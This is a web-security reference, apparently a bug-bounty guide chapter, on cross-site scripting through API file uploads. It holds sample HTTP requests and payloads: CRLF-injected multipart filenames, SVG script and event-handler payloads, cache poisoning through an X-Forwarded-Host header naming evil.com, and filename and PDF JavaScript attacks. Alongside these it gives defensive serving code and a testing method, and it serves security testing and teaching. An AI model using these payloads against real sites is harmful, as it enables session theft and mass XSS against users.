# 71 - API File Upload XSS

## Overview

API file upload mechanisms introduce XSS through:
- Multipart upload CRLF injection (Netty header injection)
- SVG upload XSS with embedded JavaScript (6+ CVEs in 2024-2026)
- Presigned URL abuse serving attacker-controlled HTML from trusted origins
- CDN cache poisoning placing XSS payloads in cached responses
- Content-Disposition filename XSS when filenames are rendered in download pages
- PDF upload with embedded JavaScript actions

## Multipart Upload CRLF Injection

### Netty Multipart Header Injection

Netty's multipart form handling has historically been vulnerable to CRLF injection in Content-Disposition headers. An attacker can inject additional headers or body content by including \r\n sequences in multipart field names or filenames.

```http
# Attack: CRLF injection in multipart filename
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="test.txt\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"

file content here
------BOUNDARY--

# The injected CRLF creates a new Content-Type header and body
# If the server echoes this back or stores it with the injected type,
# the XSS payload executes when the file is served
```

### Content-Type Override via Multipart

When a multipart upload allows the client to specify the Content-Type of a part, and the server stores and serves the file with that client-supplied type, an attacker can upload a file with `Content-Type: text/html` regardless of actual content.

```http
# Attack: Override Content-Type in multipart part header
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="data.json"
Content-Type: text/html

<script>alert(document.cookie)</script>
------BOUNDARY--

# Server stores file as data.json but with Content-Type: text/html
# When served, browser executes the JavaScript
```

## SVG Upload XSS

SVG files are XML documents that can contain arbitrary JavaScript via `<script>` elements, event handlers, and `<foreignObject>`. When served with an XML or SVG MIME type, embedded scripts execute in the browser.

### CVE Index (2024-2026)

- **CVE-2024-3568 (Hugging Face):** Stored XSS via SVG upload
- **CVE-2024-28867 (Formie):** Stored XSS via malicious SVG uploaded as file upload field
- **CVE-2024-25151 (Liferay):** Stored XSS in document/media SVG upload
- **CVE-2025-1030 (Elgg):** Stored XSS via SVG file as profile icon
- **CVE-2025-24893 (XWiki):** Stored XSS via SVG attachment
- **CVE-2026-6779:** SVG upload XSS in document management system

### SVG XSS Payload Patterns

```xml
<!-- Pattern 1: Script element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- Pattern 2: Event handler -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <rect width="100" height="100"/>
</svg>

<!-- Pattern 3: foreignObject with HTML -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.cookie)</script>
    </body>
  </foreignObject>
</svg>

<!-- Pattern 4: Animate with JavaScript URL -->
<svg xmlns="http://www.w3.org/2000/svg">
  <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">
    <rect width="100" height="100"/>
  </a>
</svg>

<!-- Pattern 5: set element with event -->
<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert(1)"/>
  <rect width="100" height="100"/>
</svg>
```

### SVG Upload Defense

```python
# SAFE: Serve SVGs with Content-Disposition: attachment
# This forces download instead of inline rendering
response.headers['Content-Disposition'] = 'attachment; filename="image.svg"'
response.headers['Content-Type'] = 'image/svg+xml'

# SAFER: Serve from a separate domain (CDN/sandbox origin)
# Even if XSS fires, it cannot access the main application's cookies

# SAFEST: Sanitize SVG server-side (strip script, event handlers, foreignObject)
# Python: defusedxml + custom SVG sanitizer
# Or convert SVG to PNG server-side before serving
```

## Presigned URL Abuse

### S3/GCS Presigned URL XSS

Cloud storage presigned URLs allow temporary access to objects. If an attacker can upload an HTML file and generate or obtain a presigned URL for it, the HTML executes in the context of the storage domain.

```
# Attack flow:
# 1. Upload malicious.html to S3 bucket via API
# 2. Generate or obtain presigned URL
# 3. Send URL to victim
# 4. Victim's browser renders HTML from S3 domain

# The XSS executes on the S3/GCS domain, not the application domain.
# Impact depends on whether the application shares cookies or tokens
# with the storage domain, or if the storage domain is same-origin.
```

### Application-Domain Presigned URLs

When the application proxies presigned URL content through its own domain (e.g., `/api/files/download?token=...`), the XSS executes on the application's origin, with full access to cookies and session tokens.

```python
# VULNERABLE: Proxying uploaded file content through application domain
@app.route('/api/files/<file_id>')
def serve_file(file_id):
    content = s3.get_object(Bucket='uploads', Key=file_id)
    return Response(
        content['Body'].read(),
        content_type=content['ContentType']  # Attacker-controlled!
    )

# SAFE: Force download and restrict Content-Type
@app.route('/api/files/<file_id>')
def serve_file(file_id):
    content = s3.get_object(Bucket='uploads', Key=file_id)
    return Response(
        content['Body'].read(),
        content_type='application/octet-stream',
        headers={
            'Content-Disposition': f'attachment; filename="{safe_filename}"',
            'X-Content-Type-Options': 'nosniff'
        }
    )
```

## CDN Cache Poisoning to XSS

### Attack Pattern

CDN cache poisoning places an XSS payload in the CDN cache so all subsequent users receive the poisoned response. The attack typically exploits unkeyed headers (headers not included in the cache key but reflected in the response).

```
# Attack: Cache poisoning via unkeyed X-Forwarded-Host header
GET /api/docs HTTP/1.1
Host: app.example.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# Response (cached by CDN):
# <base href="https://evil.com"><script>alert(1)</script>">
# OR
# <link href="https://evil.com"><script>alert(1)</script>/style.css">

# All subsequent users hitting this CDN edge receive the poisoned response
```

### Web Cache Deception vs Cache Poisoning

- **Cache Poisoning:** Attacker poisons the cache; everyone gets XSS
- **Web Cache Deception:** Attacker tricks the cache into storing a victim's sensitive response; the attacker reads it

Both are API-relevant because API responses are increasingly served through CDNs.

### CDN-Specific Risks

- Cloudflare, Fastly, and Akamai each have different cache key defaults
- Query parameter ordering, header normalization, and path canonicalization differ
- Cache-Control misconfigurations on API endpoints can cache personalized responses

## Content-Disposition Filename XSS

When a download page or file manager renders filenames from Content-Disposition headers or from stored metadata, XSS can occur if the filename is rendered without encoding.

```
# Attack: Upload file with XSS in filename
POST /api/upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="<img src=x onerror=alert(1)>.txt"

# If the application renders the filename in a file listing:
# <tr><td><img src=x onerror=alert(1)>.txt</td><td>Download</td></tr>
# XSS fires when the file listing page is viewed
```

### Filename Sanitization

```python
# SAFE: Strip or encode dangerous characters from filenames
import re
def sanitize_filename(filename):
    # Remove all characters except alphanumeric, dash, underscore, dot
    return re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
```

## PDF Upload XSS

PDF files can contain JavaScript actions that execute when opened in browser PDF viewers. While modern browsers sandbox PDF JavaScript, some older viewers and browser plugins do not.

```
# Attack: PDF with JavaScript action
# Created with tools like pdftk or manual PDF editing
# The /OpenAction or /AA (Additional Actions) dictionary contains:
# /S /JavaScript /JS (alert(document.cookie))

# When opened in a vulnerable PDF viewer within the browser,
# the JavaScript executes in the PDF viewer's context
```

## Testing Methodology

1. **Upload SVG files** with script, event handler, and foreignObject payloads
2. **Check Content-Type** on served uploaded files -- is it client-controlled?
3. **Test multipart CRLF injection** in filenames and field names
4. **Check presigned URL serving** -- same-origin or separate domain?
5. **Test CDN cache poisoning** via unkeyed headers on API endpoints
6. **Upload files with XSS in filenames** and check file listing rendering
7. **Test Content-Disposition** on served files (attachment vs inline)
8. **Upload HTML files** and check if they render on the application's domain
9. **Test PDF upload** with JavaScript actions

## Bug Bounty Tips

1. SVG upload XSS is the most common file upload XSS -- test it first (6+ CVEs)
2. Check if uploaded files are served from the same origin as the application
3. Content-Type override in multipart uploads bypasses extension-based filtering
4. Presigned URLs proxied through the application domain are high-impact XSS
5. CDN cache poisoning turns one XSS into mass exploitation
6. Filename XSS in file managers is overlooked -- test with `<img onerror>` filenames
7. The defense hierarchy: separate domain > Content-Disposition: attachment > Content-Type restriction > file content sanitization
8. Convert SVGs to PNG server-side to eliminate the entire attack surface
